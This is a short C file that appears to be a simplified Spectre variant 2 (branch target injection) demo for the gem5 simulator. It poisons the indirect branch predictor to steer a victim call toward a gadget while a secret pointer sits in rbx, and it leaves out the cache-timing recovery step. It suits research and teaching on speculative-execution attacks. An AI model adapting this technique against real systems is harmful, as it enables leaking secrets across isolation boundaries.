#include "victim.h"

/* Gives this program access to ebx */
register void *ebx __asm("rbx");

/* Poison the indirect branch predictor so that  */
void poison_branch(void) {
    /* In a real attack, the attacker and victim would be in different
     * address spaces, so this would be slightly more complicated. If
     * the address of the gadget were in kernel-space, we could
     * install a segfault handler, otherwise we could ensure some
     * dummy function was present in the attacker's address space at
     * the gadget's address. */
    cmp_func_t *target = (cmp_func_t *)&gadget;

    /* Pass input to the gadget, so we don't have to deal with a
     * segfault handler */
    int temp = 0;
    ebx = (void *)&temp;

    /* For the poisoning to work, this indirect branch must alias (in
     * the branch predictor) to the same entry as the victim indirect
     * branch. */
    (*target)(0, 0);
}

int main(void) {
    /* Poison the target branch */
    for (int i = 0; i < 1000; i++) {
        poison_branch();
    }

    /* Pass input to the gadget */
    ebx = (void *)secret;

    /* Perform a good call */
    victim_entry(&example_cmp);

    /* This is where we'd perform a cache timing attack to recover the
     * the secret, but we're using gem5 for that */

    return 0;
}
